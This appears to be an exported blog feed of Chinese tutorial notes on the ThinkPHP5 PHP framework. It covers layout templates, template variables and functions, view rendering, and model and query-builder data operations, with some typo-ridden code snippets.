<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCHEME"><figure class="iseeu highlight /scheme"><table><tr><td class="code"><pre><span class="line"><span class="symbol">'template</span><span class="symbol">'=&gt;</span>[</span><br><span class="line">    <span class="symbol">'layout_on</span><span class="symbol">'=&gt;true</span>,</span><br><span class="line">    <span class="symbol">'layout_name</span><span class="symbol">'=&gt;</span><span class="symbol">'lang</span>',</span><br><span class="line">    <span class="symbol">'layout_item</span><span class="symbol">'=&gt;</span>'&#123;__REPLACE&#125;'</span><br><span class="line">]</span><br></pre></td></tr></table></figure></div>
<p>就表示采用 application/ index/view/ lang. htm1作为布局模板。<br>如果某些页而不需要使用布局模板功能，可以在模板文件开头加上{_ _ NOLAYOUT__}字符串。<br>如果上面的 Index/index. htm模板文件里面包含有{_ <em>NOLAYOUT_</em>},则即使开启布局模板,也不会进行布局模板解析.</p>
<h2 id="2丶模板标签方式"><a href="#2丶模板标签方式" class="headerlink" title="2丶模板标签方式"></a><font color=green>2丶模板标签方式</font></h2><p>这种布局模板不需要在配置文件中设置任何参数，也不需要开启 ayout on，直接在模板文件中指定布局模板即可，相关的布局模板调整也在模板中进行。<br>以前面的输出模板为例，这种方式的入口还是在 index/index. htm模板，但是我们可以修改下 index模板文件的内容，在头部增加下面的布局标签（记得首先关闭前面的layout_ on设置，否则可能出现布局循环）：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">&#123;layout <span class="attribute">name</span>=<span class="string">"layout"</span>/&#125;</span><br></pre></td></tr></table></figure></div>
<p>表示当前模板文件需要使用1 Layout. htm1布局模板文件，而布局模板文件的写法上面第一种方式是一样的。当渲染 index./ index. htm模板文件的时候，如果读取到 layout标签，则会把当前模板的解析内容替换到 layout布局模板的{<em>_CONTENT</em> _}特定字符串。<br>个模板文件只能使用一个布局模板，如果模板文件中没有使用任何1 ayout标签则表示当前模板不使用任何布局如果需要使用其他的布局模板，可以改变 layout的name属性，例如：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">&#123;layout <span class="built_in">name</span>=<span class="string">"newlayout"</span> /&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="3丶layout控制模板布局"><a href="#3丶layout控制模板布局" class="headerlink" title="3丶layout控制模板布局"></a><font color=green>3丶layout控制模板布局</font></h2><p>使用内置的ayou方法可以更灵活的在程序中控制模板输出的布局功能，尤其适用于局部需要布局或者关闭布局的情况，这种方式也不需要在配置文件中开启 layout_on.<br>三种模板布局方式中，第一种和第三种是在程序中配置实现模板布局，第二种方式则是单纯通过模板标签在模板中使用布局。<br>具体选择什么方式，需要根据项目的实际情况来了。</p>
]]></content>
      <categories>
        <category>thinkphp5</category>
      </categories>
      <tags>
        <tag>thinkphp5</tag>
      </tags>
  </entry>
  <entry>
    <title>13.thinkphp5模板系统变量输出和函数使用</title>
    <url>/undefined/13.thinkphp5%E6%A8%A1%E6%9D%BF%E7%B3%BB%E7%BB%9F%E5%8F%98%E9%87%8F%E8%BE%93%E5%87%BA%E5%92%8C%E5%87%BD%E6%95%B0%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="一丶模板系统变量输出和函数使用"><a href="#一丶模板系统变量输出和函数使用" class="headerlink" title="一丶模板系统变量输出和函数使用"></a><font color=red>一丶模板系统变量输出和函数使用</font></h1><h2 id="1丶系统变量输出"><a href="#1丶系统变量输出" class="headerlink" title="1丶系统变量输出"></a><font color=green>1丶系统变量输出</font></h2><p>普通的模板变量需要首先赋值之后才能在模板中输出，但是系统变量则不需要，可以直接在模板中输出，系统变量的输出通常以{$Think打头，例如：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PUPPET"><figure class="iseeu highlight /puppet"><table><tr><td class="code"><pre><span class="line">&#123;<span class="variable">$Think</span>, server, server_name&#125;//输出 <span class="variable">$_SERVER</span>[<span class="string">'SERVER_NAME'</span>]变量;</span><br><span class="line">&#123;<span class="variable">$Think</span>, session. user_id&#125;//输出<span class="variable">$_SESSION</span>[<span class="string">'user_id]变量;</span></span><br><span class="line"><span class="string">&#123;<span class="variable">$Think</span>,get.pageNumber&#125;//输出<span class="variable">$_GET</span>['</span>pageNumber]变量;</span><br><span class="line">&#123;<span class="variable">$Think</span>. cookie.name&#125;/输出<span class="variable">$_C0OKIE</span>[<span class="string">'name'</span>]变量;</span><br></pre></td></tr></table></figure></div>
<p>支持输出$_SERVER丶$_ENV丶$_POST丶$_GET丶$_REQUEST丶$_SESSION和$_COOKIE变量。</p>
<h2 id="2丶常量输出"><a href="#2丶常量输出" class="headerlink" title="2丶常量输出"></a><font color=green>2丶常量输出</font></h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AUTOIT"><figure class="iseeu highlight /autoit"><table><tr><td class="code"><pre><span class="line">&#123;$Think.<span class="keyword">const</span>.APP_PATH&#125;或者直接使用&#123;$Think.APP_PATH&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="3丶配置输出"><a href="#3丶配置输出" class="headerlink" title="3丶配置输出"></a><font color=green>3丶配置输出</font></h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="REASONML"><figure class="iseeu highlight /reasonml"><table><tr><td class="code"><pre><span class="line">&#123;$<span class="module-access"><span class="module"><span class="identifier">Think</span>.</span></span>config.defaule_moudle&#125;</span><br><span class="line">&#123;$<span class="module-access"><span class="module"><span class="identifier">Think</span>.</span></span>config.default_controller&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="4丶使用函数"><a href="#4丶使用函数" class="headerlink" title="4丶使用函数"></a><font color=green>4丶使用函数</font></h2><p>我们往往需要对模板输出变量使用函数，可以使用：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="FORTRAN"><figure class="iseeu highlight /fortran"><table><tr><td class="code"><pre><span class="line">&#123;$<span class="keyword">data</span>.<span class="keyword">name</span>|md5&#125;</span><br></pre></td></tr></table></figure></div>
<p>编译后的结果是：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> (md5(data[name]));<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></div>
<p>如果函数有多个参数需要调用，则使用：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CLEAN"><figure class="iseeu highlight /clean"><table><tr><td class="code"><pre><span class="line">&#123;$create_time|date=<span class="string">"y-m-d"</span>,###&#125;</span><br></pre></td></tr></table></figure></div>
<p>表示date函数传入两个参数，每个参数用逗号分割，这里第一个参数是y-m-d，第二个参数是前面要输出的create time变量，因为该变量是第二个参数，因此需要用###标识变量位置，编译后的结果是：  </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>php echo(<span class="built_in">date</span>(y-m-d,<span class="built_in">create</span> <span class="built_in">time</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>还可以支持多个函数过滤，多个函数之间用““分割即可，例如:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="COQ"><figure class="iseeu highlight /coq"><table><tr><td class="code"><pre><span class="line">($name|<span class="type">md5</span>|<span class="type">strtoupper</span>|<span class="type">substr</span>=<span class="number">0</span>,<span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure></div>
<p>编译后的结果是：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> (substr(strtoupper(md5($name)),<span class="number">0</span>,<span class="number">3</span>));<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></div>
<p>函数会按照从左到右的顺序依次调用。<br>如果你觉得这样写起来比较麻烦，也可以直接这样写：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CLOJURE"><figure class="iseeu highlight /clojure"><table><tr><td class="code"><pre><span class="line">&#123;<span class="symbol">:substr</span>(<span class="name">strtoupper</span>(<span class="name">md5</span>($name)),<span class="number">0</span>,<span class="number">3</span>)&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>thinkphp5</category>
      </categories>
      <tags>
        <tag>thinkphp5</tag>
      </tags>
  </entry>
  <entry>
    <title>12.thinkphp5视图之模板赋值和模板渲染</title>
    <url>/undefined/12.thinkphp5%E8%A7%86%E5%9B%BE%E4%B9%8B%E6%A8%A1%E6%9D%BF%E8%B5%8B%E5%80%BC%E5%92%8C%E6%A8%A1%E6%9D%BF%E6%B8%B2%E6%9F%93/</url>
    <content><![CDATA[<h1 id="一丶视图之模板赋值和模板渲染"><a href="#一丶视图之模板赋值和模板渲染" class="headerlink" title="一丶视图之模板赋值和模板渲染"></a><font color=red>一丶视图之模板赋值和模板渲染</font></h1><h2 id="首先创建文件夹"><a href="#首先创建文件夹" class="headerlink" title="首先创建文件夹"></a><font color=green>首先创建文件夹</font></h2><p><img src="https://i.imgur.com/lu7oH89.png" alt="1"> </p>
<h2 id="1丶视图实例化"><a href="#1丶视图实例化" class="headerlink" title="1丶视图实例化"></a><font color=green>1丶视图实例化</font></h2><p>视图由\think\View类配合试图驱动（模板引擎）类一起完成，目前的内置模板引擎包含PHP原生模板和think模板引擎；   </p>
<p>因为新版的控制器可以无需继承任何的基础类，因此在控制器中如何使用视图决定于你怎么定义控制器。   </p>
<h2 id="2丶继承-think-Controller类"><a href="#2丶继承-think-Controller类" class="headerlink" title="2丶继承\think\Controller类"></a><font color=green>2丶继承\think\Controller类</font></h2><p>如果你的控制器继承了\think\Controller类的话，则无需自己实例化视图类，可以直接调用控制器基础类封装的相关视图类的方法。<br>|下面的方法可以直接被调用|方法|<br>|  —- | —- |<br>|fetch|渲染模板输出|<br>|display|渲染内容输出|<br>|assign|模板变量赋值|<br>|engine|初始化模板引擎|</p>
<h2 id="3丶模板赋值"><a href="#3丶模板赋值" class="headerlink" title="3丶模板赋值"></a><font color=green>3丶模板赋值</font></h2><p>除了系统变量和配置参数输出无需赋值外，其他变量如果需要在模板中输出必须首先进行模板赋值操作，绑定数据到模板输出有以下方式：   </p>
<h2 id="assign方法"><a href="#assign方法" class="headerlink" title="assign方法"></a><font color=green>assign方法</font></h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCALA"><figure class="iseeu highlight /scala"><table><tr><td class="code"><pre><span class="line">namespace index \appcontroller； </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">\think\Controller</span> </span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">function</span> <span class="title">index（）</span></span></span><br><span class="line"><span class="class"><span class="title">/模板变量赋值</span></span></span><br><span class="line"><span class="class"><span class="title">$name</span> <span class="title">=ThinkPHP：</span></span></span><br><span class="line"><span class="class"><span class="title">$eamil</span> <span class="title">=thinkphp@qq</span>.<span class="title">comi</span> </span></span><br><span class="line"><span class="class"><span class="title">$this-&gt;assign（</span>'<span class="title">name</span>'<span class="title">，</span> <span class="title">$name</span> <span class="title">）</span></span></span><br><span class="line"><span class="class"><span class="title">$this-&gt;assign（‘email’</span>,<span class="title">$email）</span></span></span><br><span class="line"><span class="class"><span class="title">//或者批量赋值</span></span></span><br><span class="line"><span class="class"><span class="title">$this-&gt;assign（</span>[</span></span><br><span class="line"><span class="class">        ‘name’ =&gt; $name </span></span><br><span class="line"><span class="class">          'email'=&gt;$email</span></span><br><span class="line"><span class="class">//模板输出</span></span><br><span class="line"><span class="class">return $this-&gt;fetch（'index'）；</span></span><br><span class="line"><span class="class">&#125;</span></span><br></pre></td></tr></table></figure></div>
<h2 id="4丶模板渲染"><a href="#4丶模板渲染" class="headerlink" title="4丶模板渲染"></a><font color=green>4丶模板渲染</font></h2><p>模板渲染最常用的是使用\think\View类的fetch方法，调用格式：   </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">fetch</span><span class="params">(<span class="string">'[模板文件]'</span>,[<span class="string">'模板变量（数组）'</span>])</span></span></span><br></pre></td></tr></table></figure></div>
<p>模板文件的写法支持下面几种：<br>|用法|描述|<br>|——|————-|<br>|不带任何参数|自动定位当前操作的模板文件|<br>|模块[操作]|常用写法，支持跨模块|<br>|完整的模板文件名|直接使用完整的模板文件名(包括模板)|<br>下面是一个最典型的用法，不带任何参数：   </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="KOTLIN"><figure class="iseeu highlight /kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//不带任何参数，自动定位当前操作的模板文件</span></span><br><span class="line"><span class="keyword">return</span> $<span class="keyword">this</span>-&gt;fetch();</span><br></pre></td></tr></table></figure></div>
<p>表示系统会按照默认规则自动定位模板文件，其规则是：   </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GCODE"><figure class="iseeu highlight /gcode"><table><tr><td class="code"><pre><span class="line">当前模块/默认视图目录/当前控制器<span class="comment">(小写)</span>/当前操作<span class="comment">(小写)</span>.html;</span><br></pre></td></tr></table></figure></div>
<p>可以在fetch方法里面去写对应的模板名，他会去当前控制器下面去找对应的模板文件；</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="KOTLIN"><figure class="iseeu highlight /kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//指定模板输出</span></span><br><span class="line"><span class="keyword">return</span> $<span class="keyword">this</span>-&gt;fetch(<span class="string">'edit'</span>);</span><br></pre></td></tr></table></figure></div>
<p>另外fetch方法支持跨模块的操作</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="KOTLIN"><figure class="iseeu highlight /kotlin"><table><tr><td class="code"><pre><span class="line">表示调用user控制器下面的user模板。</span><br><span class="line"><span class="keyword">return</span> $<span class="keyword">this</span>-&gt;fetch(<span class="string">'user/user'</span>);</span><br></pre></td></tr></table></figure></div>
<h3 id="调用方法："><a href="#调用方法：" class="headerlink" title="调用方法："></a>调用方法：</h3><p><img src="https://i.imgur.com/aKOSRYQ.png" alt="1"> </p>
<h2 id="5丶传入参数方法"><a href="#5丶传入参数方法" class="headerlink" title="5丶传入参数方法"></a><font color=green>5丶传入参数方法</font></h2><p>方法fetch可以传入模板变量，例如：   </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCALA"><figure class="iseeu highlight /scala"><table><tr><td class="code"><pre><span class="line">namespace app\index\controller;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">think\Controller</span> </span>&#123;</span><br><span class="line">        public function index()</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> sthis-&gt;fetch(<span class="symbol">'inde</span>x'[</span><br><span class="line">                <span class="symbol">'nam</span>e'=&gt;<span class="symbol">'Think</span> <span class="type">PHP</span>', <span class="symbol">'emai</span>l'=&gt;<span class="symbol">'thinkphp</span><span class="meta">@qq</span>.com'</span><br><span class="line">            ]);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="6丶助手函数"><a href="#6丶助手函数" class="headerlink" title="6丶助手函数"></a><font color=green>6丶助手函数</font></h2><p>如果使用view助手函数渲染输出的话，可以使用下面的方法进行模板变量赋值：  </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DART"><figure class="iseeu highlight /dart"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> view(<span class="string">'index'</span>,[</span><br><span class="line">    <span class="string">'name'</span>=&gt;<span class="string">'thinkphp'</span>,</span><br><span class="line">    <span class="string">'email'</span>=&gt;<span class="string">'thinkphp<span class="subst">$qq</span>.com'</span></span><br><span class="line">]);</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>thinkphp5</category>
      </categories>
      <tags>
        <tag>thinkphp5</tag>
      </tags>
  </entry>
  <entry>
    <title>11.thinkphp5模型操作之删除数据</title>
    <url>/undefined/11.thinkphp5%E6%A8%A1%E5%9E%8B%E6%93%8D%E4%BD%9C%E4%B9%8B%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/</url>
    <content><![CDATA[<h1 id="一丶模型操作之删除数据"><a href="#一丶模型操作之删除数据" class="headerlink" title="一丶模型操作之删除数据"></a><font color=red>一丶模型操作之删除数据</font></h1><h2 id="1丶删除当前模型"><a href="#1丶删除当前模型" class="headerlink" title="1丶删除当前模型"></a><font color=green>1丶删除当前模型</font></h2><p>删除模型数据，可以实例化模型后调用delete方法</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$user</span> = User::get(<span class="number">1</span>);</span><br><span class="line"><span class="variable">$user</span>-&gt;delete();</span><br></pre></td></tr></table></figure></div>
<h2 id="2丶根据主键删除"><a href="#2丶根据主键删除" class="headerlink" title="2丶根据主键删除"></a><font color=green>2丶根据主键删除</font></h2><p>或者直接调用静态方法   </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">User::destroy(<span class="number">1</span>)</span><br><span class="line"><span class="comment">//支持删除多个数据</span></span><br><span class="line">User::destroy(<span class="string">'1,2,3'</span>);</span><br><span class="line"><span class="comment">//或者</span></span><br><span class="line">User::destroy([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]);</span><br></pre></td></tr></table></figure></div>
<h2 id="3丶条件删除"><a href="#3丶条件删除" class="headerlink" title="3丶条件删除"></a><font color=green>3丶条件删除</font></h2><p>使用数组进行条件删除，例如：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//删除状态为0的数据</span></span><br><span class="line">User::destroy([<span class="string">'status'</span>=&gt;<span class="number">0</span>]);</span><br></pre></td></tr></table></figure></div>
<p>或者通过数据库类的查询条件删除</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVESCRIPT"><figure class="iseeu highlight /livescript"><table><tr><td class="code"><pre><span class="line">User::where<span class="function"><span class="params">(<span class="string">'id'</span>,<span class="string">'&gt;'</span>,<span class="number">10</span>)</span>-&gt;</span><span class="keyword">delete</span>();</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>thinkphp5</category>
      </categories>
      <tags>
        <tag>thinkphp5</tag>
      </tags>
  </entry>
  <entry>
    <title>10.thinkphp5模型操作之查询数据</title>
    <url>/undefined/10.thinkphp5%E6%A8%A1%E5%9E%8B%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE/</url>
    <content><![CDATA[<h1 id="一丶模型操作之查询数据"><a href="#一丶模型操作之查询数据" class="headerlink" title="一丶模型操作之查询数据"></a><font color=red>一丶模型操作之查询数据</font></h1><h2 id="1丶获取单个数据"><a href="#1丶获取单个数据" class="headerlink" title="1丶获取单个数据"></a><font color=green>1丶获取单个数据</font></h2><p><img src="https://i.imgur.com/r5MBwFC.png" alt="1"> </p>
<h2 id="2丶获取多个数据"><a href="#2丶获取多个数据" class="headerlink" title="2丶获取多个数据"></a><font color=green>2丶获取多个数据</font></h2><p><img src="https://i.imgur.com/4wU4rjB.png" alt="1"> </p>
<h2 id="3丶聚合"><a href="#3丶聚合" class="headerlink" title="3丶聚合"></a><font color=green>3丶聚合</font></h2><p><img src="https://i.imgur.com/0ZWVjMe.png" alt="1"> </p>
]]></content>
      <categories>
        <category>thinkphp5</category>
      </categories>
      <tags>
        <tag>thinkphp5</tag>
      </tags>
  </entry>
  <entry>
    <title>9.thinkphp5模型操作之更新数据</title>
    <url>/undefined/9.thinkphp5%E6%A8%A1%E5%9E%8B%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%9B%B4%E6%96%B0%E6%95%B0%E6%8D%AE/</url>
    <content><![CDATA[<h1 id="一丶模型操作之更新数据"><a href="#一丶模型操作之更新数据" class="headerlink" title="一丶模型操作之更新数据"></a><font color=red>一丶模型操作之更新数据</font></h1><h2 id="1丶查找并更新"><a href="#1丶查找并更新" class="headerlink" title="1丶查找并更新"></a><font color=green>1丶查找并更新</font></h2><p><img src="https://i.imgur.com/rHDc90y.png" alt="1"><br><font size=3>解释：  </font><br>调用UserModel模型的get方法;<br>“（1）”表示get主键为1的数据<br>save（）方法判断</p>
<h2 id="2丶直接更新数据"><a href="#2丶直接更新数据" class="headerlink" title="2丶直接更新数据"></a><font color=green>2丶直接更新数据</font></h2><p><img src="https://i.imgur.com/XUUONWY.png" alt="1"><br><font size=3>解释：  </font><br>还是调用get方法选择数据<br>save（）方法直接进行保存，将name保存为刘涛</p>
<h2 id="3丶批量更新数据"><a href="#3丶批量更新数据" class="headerlink" title="3丶批量更新数据"></a><font color=green>3丶批量更新数据</font></h2><p><img src="https://i.imgur.com/S6Nxat1.png" alt="1"> </p>
<h2 id="4丶通过数据库类更新数据"><a href="#4丶通过数据库类更新数据" class="headerlink" title="4丶通过数据库类更新数据"></a><font color=green>4丶通过数据库类更新数据</font></h2><p><img src="https://i.imgur.com/3DRiYoV.png" alt="1"> </p>
<h2 id="5丶静态方法"><a href="#5丶静态方法" class="headerlink" title="5丶静态方法"></a><font color=green>5丶静态方法</font></h2><p><img src="https://i.imgur.com/MppLkpE.png" alt="1"> </p>
]]></content>
      <categories>
        <category>thinkphp5</category>
      </categories>
      <tags>
        <tag>thinkphp5</tag>
      </tags>
  </entry>
  <entry>
    <title>8.thinkphp5模型定义与新增数据</title>
    <url>/undefined/8.thinkphp5%E6%A8%A1%E5%9E%8B%E5%AE%9A%E4%B9%89%E4%B8%8E%E6%96%B0%E5%A2%9E%E6%95%B0%E6%8D%AE/</url>
    <content><![CDATA[<h1 id="一丶模型定义与新增数据"><a href="#一丶模型定义与新增数据" class="headerlink" title="一丶模型定义与新增数据"></a><font color=red>一丶模型定义与新增数据</font></h1><h2 id="模型定义"><a href="#模型定义" class="headerlink" title="模型定义"></a><font color=red>模型定义</font></h2><p><font color=red size=3>大多数情况下，我们无需为模型定义任何的属性和方法即可完成基础的操作。   </p>
<p>因为模型会自动对应一个数据表。   </font></p>
<p>规范是：数据库前缀+当前的模型类名（不含命名空间）因为模型类名是驼峰法，所以获取实际的数据表的时候会自动转换为小写+下划线命名的数据表名称。<br><font color = green size=3>先在数据库创建一个think_user数据表：<br><img src="https://i.imgur.com/Wu2V5it.png" alt="1"></p>
<p>模型定义的话先在application下，index模块下创建一个模型文件夹，创建一个User.php模型</font><br><img src="https://i.imgur.com/cUz5yF7.png" alt="1"><br>然后按照图示命名空间和继承thinkphp下的Modle模型；<br>然后在controller控制器下创建User.php控制器</p>
<h2 id="新增数据1"><a href="#新增数据1" class="headerlink" title="新增数据1"></a><font color=red>新增数据1</font></h2><p><img src="https://i.imgur.com/Xtf2ymH.png" alt="1">   </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$user</span>-&gt;save()</span><br></pre></td></tr></table></figure></div>
<p>$user调用save（）这个方法；如果调用save这个方法有返回值，就表示用户新增成功</p>
<h2 id="新增数据2（使用create方法）"><a href="#新增数据2（使用create方法）" class="headerlink" title="新增数据2（使用create方法）"></a><font color=red>新增数据2（使用create方法）</font></h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">$user[<span class="string">'name'</span>]=<span class="string">'yym'</span>;   </span><br><span class="line">$user[<span class="string">'email'</span>]=<span class="string">'1806849051@qq.com'</span>;   </span><br><span class="line">$user[<span class="string">'birthday'</span>]=strtotime(<span class="string">'1999-12-14'</span>);</span><br><span class="line"><span class="keyword">if</span>($result = UserModel::create($user))&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'用户新增成功'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'用户新增失败'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="新增数据3（批量新增数据）"><a href="#新增数据3（批量新增数据）" class="headerlink" title="新增数据3（批量新增数据）"></a><font color=red>新增数据3（批量新增数据）</font></h2><p><img src="https://i.imgur.com/3schQ0t.png" alt="1"> </p>
]]></content>
      <categories>
        <category>thinkphp5</category>
      </categories>
      <tags>
        <tag>thinkphp5</tag>
      </tags>
  </entry>
  <entry>
    <title>7.thinkphp5数据库查询之查询构造器2</title>
    <url>/undefined/7.thinkphp5%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%9F%A5%E8%AF%A2%E6%9E%84%E9%80%A0%E5%99%A82/</url>
    <content><![CDATA[<h1 id="二丶数据库查询之查询构造器"><a href="#二丶数据库查询之查询构造器" class="headerlink" title="二丶数据库查询之查询构造器"></a><font color = red >二丶数据库查询之查询构造器</font></h1><h2 id="一丶查询数据"><a href="#一丶查询数据" class="headerlink" title="一丶查询数据"></a><font color = green >一丶查询数据</font></h2><p>最普通的查询就是判断某个字段是否等于某个值，而select（）方法用于查询数据集，如果查询成功，返回的是一个二维数组，如果没有满足条件的话则返回空数组。      </p>
<p>find（）方法用于查找满足条件的第一个记录（即使你的查询条件有多个符合的数据），如果查询成功，返回的是一个一维数组，没有满足条件的话默认返回null；   </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVESCRIPT"><figure class="iseeu highlight /livescript"><table><tr><td class="code"><pre><span class="line">$result = Db::name<span class="function"><span class="params">(<span class="string">'data'</span>)</span>-&gt;</span>where<span class="function"><span class="params">(<span class="string">'status'</span>,<span class="number">1</span>)</span>-&gt;</span>find();   </span><br><span class="line">$result = Db::name<span class="function"><span class="params">(<span class="string">'data'</span>)</span>-&gt;</span>where<span class="function"><span class="params">(<span class="string">'status'</span>,<span class="number">1</span>)</span>-&gt;</span>select();</span><br></pre></td></tr></table></figure></div>
<h2 id="模糊查询："><a href="#模糊查询：" class="headerlink" title="模糊查询："></a><font color = green >模糊查询：</font></h2><p><font color = green >查询name中含有’明’的数据</font></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVESCRIPT"><figure class="iseeu highlight /livescript"><table><tr><td class="code"><pre><span class="line">$result = Db::name<span class="function"><span class="params">(<span class="string">'data'</span>)</span>-&gt;</span>where<span class="function"><span class="params">(<span class="string">'name'</span>,<span class="string">'like'</span>,<span class="string">'%明%'</span>)</span>-&gt;</span>select();</span><br></pre></td></tr></table></figure></div>
<h2 id="区间查询："><a href="#区间查询：" class="headerlink" title="区间查询："></a><font color = green >区间查询：</font></h2><p><font color = green >查询id区间为2~6的数据</font></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVESCRIPT"><figure class="iseeu highlight /livescript"><table><tr><td class="code"><pre><span class="line">$result = Db::name<span class="function"><span class="params">(<span class="string">'data'</span>)</span>-&gt;</span>where<span class="function"><span class="params">(<span class="string">'id'</span>,<span class="string">'BETWEEN'</span>,[<span class="number">2</span>,<span class="number">6</span>])</span>-&gt;</span>select();</span><br></pre></td></tr></table></figure></div>
